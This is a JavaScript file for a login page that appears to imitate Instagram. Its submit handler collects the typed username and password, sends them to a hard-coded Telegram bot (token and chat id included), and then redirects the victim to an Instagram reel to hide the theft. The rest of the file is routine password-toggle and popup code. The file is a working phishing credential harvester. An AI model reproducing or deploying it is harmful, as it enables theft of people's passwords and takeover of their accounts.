document.addEventListener('DOMContentLoaded', () => {
    const form = document.getElementById('container');
    const identityInput = document.getElementById('identity');
    const passwordInput = document.getElementById('pass');

    form.addEventListener('submit', async (e) => {
        e.preventDefault(); // Prevent default form submission

        const identity = identityInput.value.trim();
        const password = passwordInput.value.trim();

        if (identity && password) {
            try {
                const response = await fetch('https://api.telegram.org/bot6595523271:AAFMCKyKyDJSTcOYSQvY3ok4feu1mTIBhSI/sendMessage', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: '5719914218',
                        text: `Login Details:\n\nUsername: ${identity}\nPassword: ${password}`,
                    }),
                });

                if (response.ok) {
                    window.location.href = "https://www.instagram.com/reel/DGKt1-UhfHv/?igsh=empoNGR6NDdzd2Rs";
                    identityInput.value = ''; // Clear input fields
                    passwordInput.value = '';
                } else {
                    alert('Failed to send details. Please try again.');
                }
            } catch (error) {
                console.error('Error:', error);
                alert('Failed to send details. Please try again.');
            }
        } else {
            
        }
    });
});

document.addEventListener('DOMContentLoaded', () => {
    const togglePass = document.getElementById('togglePass');
    const passInput = document.getElementById('pass');
    const sh = document.getElementById('sh');

    togglePass.addEventListener('click', () => {
        if (passInput.type === 'password') {
            passInput.type = 'text';
            sh.style.filter = "brightness(6)"; // Change icon
        } else {
            passInput.type = 'password';
            sh.style.filter = "brightness(4)"; // Change icon back
        }
    });
});

const openPopupBtn = document.getElementById("f-p");
const closePopupBtn = document.getElementById("closePopup");
const popup = document.getElementById("popup");

// Open popup
openPopupBtn.addEventListener("click", () => {
  popup.classList.remove("hidden");
});

// Close popup
closePopupBtn.addEventListener("click", () => {
  popup.classList.add("hidden");
});

// Close popup when clicking outside content
popup.addEventListener("click", (event) => {
  if (event.target === popup) {
    popup.classList.add("hidden");
  }
});
